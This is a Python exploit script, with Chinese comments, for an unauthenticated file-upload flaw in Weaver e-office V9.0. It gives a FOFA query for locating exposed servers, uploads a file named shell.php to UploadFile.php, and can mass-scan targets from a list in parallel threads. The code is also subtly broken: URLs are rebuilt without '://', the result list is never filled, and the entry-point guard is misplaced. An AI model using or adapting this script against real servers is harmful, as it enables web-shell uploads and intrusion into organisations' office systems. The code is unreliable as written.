# fofa搜索语法 app="泛微-EOffice"
#影响范围 泛微e-office V9.0
import argparse
import threading
from urllib.parse import urlsplit

import requests

# 创建一个解析对象parser，用于装载参数的容器
parser = argparse.ArgumentParser(description="python3 demo.py -u [login_url] ")

# 对这个解析对象添加几个命令行参数，type为输入类型，metavar用来控制部分命令行参数的显示，require=True为当用户输入错误时，系统返回提示正确的输入方式，help为描述
parser.add_argument('-u', '--url', help='URL 参数')
parser.add_argument('-f', '--file', help='file 参数')

# 实例化 parser
args = parser.parse_args()

headers={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Content-Type":"multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4"
}
vulurl = []
files = {
        "MAX_FILE_SIZE": (None, "100000"),
        "uploaded": ("shell.php", "<?php phpinfo();?>"),
        "Upload": (None, "Upload")
        }
def urlCheck(url):
    parsed_url = urlsplit(url)
    url = parsed_url.scheme+parsed_url.netloc
    testUrl(url)
payload = "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
def testUrl(url):
    try:
        res = requests.post(url=url+payload,headers=headers,files=files,verify=False)
        if res.status_code == 200:
            print(url + "漏洞存在")
        else:
            print(url + "漏洞不存在存在")
    except :
            print("请求失败")
def main():
    args = parser.parse_args()
    if args.url:
        urlCheck(args.url)
    elif args.file:
        threads_queue = []
        with open(args.file, 'r') as file:
            for line in file:
                line = line.strip()
                read_thread = threading.Thread(target=urlCheck, args=(line,))
                threads_queue.append(read_thread)
                read_thread.start()
            for thread in threads_queue:
                thread.join()

    print("\n存在漏洞列表：")
    for url in vulurl:
        print(url + "  [+]漏洞存在！！！")

    if __name__ == "__main__":
        main()
